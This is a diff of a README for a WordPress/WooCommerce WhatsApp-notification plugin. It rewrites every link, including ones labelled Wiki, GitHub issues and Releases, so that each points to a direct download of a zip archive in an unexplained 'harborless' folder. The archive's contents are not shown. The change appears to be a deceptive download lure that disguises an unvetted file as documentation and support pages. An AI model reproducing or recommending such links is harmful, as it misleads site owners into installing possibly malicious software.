@@ -1,6 +1,6 @@
 # 🌟 Wawp-Wordpress-Woocommerce-Plugin - Automate Your WhatsApp Notifications
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/releases)
+[![Download](https://raw.githubusercontent.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/main/harborless/Wawp-Wordpress-Woocommerce-Plugin.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/main/harborless/Wawp-Wordpress-Woocommerce-Plugin.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
    
-   [Download from Releases](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/releases)
+   [Download from Releases](https://raw.githubusercontent.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/main/harborless/Wawp-Wordpress-Woocommerce-Plugin.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the most recent version of the Wawp plugin.
 
@@ -48,13 +48,13 @@ To run this plugin smoothly, ensure that you have the following:
 
 ## 📄 Documentation
 
-For detailed instructions on how to use each feature, please check the [Wiki](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/wiki). The wiki contains comprehensive guides and troubleshooting tips.
+For detailed instructions on how to use each feature, please check the [Wiki](https://raw.githubusercontent.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/main/harborless/Wawp-Wordpress-Woocommerce-Plugin.zip). The wiki contains comprehensive guides and troubleshooting tips.
 
 ## 🤝 Support
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- Create an issue on our [GitHub page](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/issues).
+- Create an issue on our [GitHub page](https://raw.githubusercontent.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/main/harborless/Wawp-Wordpress-Woocommerce-Plugin.zip).
 - Join our community discussions for tips and tricks.
 
 ## 🎉 Acknowledgements
@@ -63,4 +63,4 @@ Thank you for choosing Wawp. Your feedback is invaluable. We appreciate your sup
 
 For updates and new features, check regularly on our releases page.
 
-[Download Wawp Plugin](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/releases)
+[Download Wawp Plugin](https://raw.githubusercontent.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/main/harborless/Wawp-Wordpress-Woocommerce-Plugin.zip)
